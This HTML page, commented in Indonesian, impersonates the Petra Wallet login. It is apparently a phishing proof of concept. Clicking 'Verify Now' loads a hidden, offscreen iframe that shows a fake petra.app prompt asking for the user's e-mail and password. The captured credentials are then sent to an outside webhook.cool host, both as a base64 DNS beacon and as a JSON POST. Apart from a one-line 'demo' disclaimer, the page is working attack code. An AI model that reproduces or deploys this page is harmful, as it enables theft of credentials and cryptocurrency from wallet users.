<!DOCTYPE html>
<html lang="en-US">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, user-scalable=no">
  <title>petra.app</title>
  <style>
    body { 
      margin: 0; padding: 0; height: 100vh; background: #0f172a; color: #e2e8f0;
      font-family: system-ui, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center;
    }
    .logo { font-size: 80px; margin-bottom: 20px; }
    h1 { font-size: 28px; margin-bottom: 20px; }
    p { font-size: 18px; color: #94a3b8; margin-bottom: 40px; max-width: 500px; }
    .btn {
      padding: 18px 40px; font-size: 20px; background: #22c55e; color: black; border: none; border-radius: 16px;
      cursor: pointer; box-shadow: 0 10px 40px rgba(34,197,94,0.6); font-weight: bold; transition: 0.3s;
    }
    .btn:hover { background: #16a34a; transform: scale(1.05); }
    .warning { margin-top: 40px; color: #ef4444; font-weight: bold; font-size: 14px; }
    
    /* PERBAIKAN CSS IFRAME */
    iframe { 
      position: absolute; 
      left: 0; 
      top: -9999px; /* Pindah ke atas layar agar tidak terlihat */
      width: 100%; /* Lebar penuh agar prompt muncul */
      height: 100%; /* Tinggi penuh */
      border: none; 
    }
  </style>
</head>
<body>
  <div class="logo">ðŸŸ¢</div>
  <h1>Petra Wallet</h1>
  <p>Click below to verify your account and continue</p>
  <button class="btn" onclick="prepareExploit()">Verify Now</button>

  <div class="warning">This is a demo â€” do not use on real wallet!</div>

  <!-- IFRAME HIDDEN -->
  <!-- PERBAIKAN: Tambahkan 'allow-same-origin' agar bisa di-focus() -->
  <iframe id="exploitFrame" sandbox="allow-scripts allow-modals allow-same-origin"></iframe>

  <script>
    // WEBHOOK KAMU
    const OOB = "keen-unicorn-32.webhook.cool";

    function prepareExploit() {
      const iframe = document.getElementById('exploitFrame');

      // Inject HTML + Script ke iframe (hidden & offscreen)
      // Menggunakan backtick (`) untuk template literal
      iframe.srcdoc = `
        <script>
          // Prompt mirip Petra resmi
          const creds = prompt("petra.app says:\\n\\nIn order to access your Petra Wallet you must first login on your\\npetra.app Account.\\n\\nPlease type your e-mail and your password:");

          if (creds && creds.trim() !== "") {
            // Kirim ke parent via postMessage
            parent.postMessage({
              type: "CREDENTIALS_STOLEN",
              creds: creds.trim(),
              ua: navigator.userAgent,
              url: location.href
            }, "*");
          }
        </\script>
      `;
    }

    // Trigger saat user blur window (klik luar, switch app, dll)
    window.onblur = function () {
      const iframe = document.getElementById('exploitFrame');
      if (iframe.srcdoc) {
        try {
            // PERBAIKAN: Coba focus iframe (memerlukan allow-same-origin)
            iframe.contentWindow.focus();
        } catch(e) {
            console.error("Gagal focus iframe (Sandbox policy):", e);
        }
      }
    };

    // Parent tangkap postMessage & exfil
    window.addEventListener("message", (event) => {
      if (event.data && event.data.type === "CREDENTIALS_STOLEN") {
        const creds = event.data.creds;
        const ua = event.data.ua;

        // Exfil via DNS OOB (super stealth)
        // PERBAIKAN: Gunakan backtick (`) untuk interpolasi string
        const beacon = btoa(creds).replace(/=/g, '').substring(0, 500);
        new Image().src = `https://${beacon}.${OOB}`;

        // Backup POST (full data)
        fetch(`https://${OOB}/petra-creds`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            credentials: creds,
            userAgent: ua,
            timestamp: new Date().toISOString()
          })
        }).catch(() => {});
      }
    });
  </script>
</body>
</html>
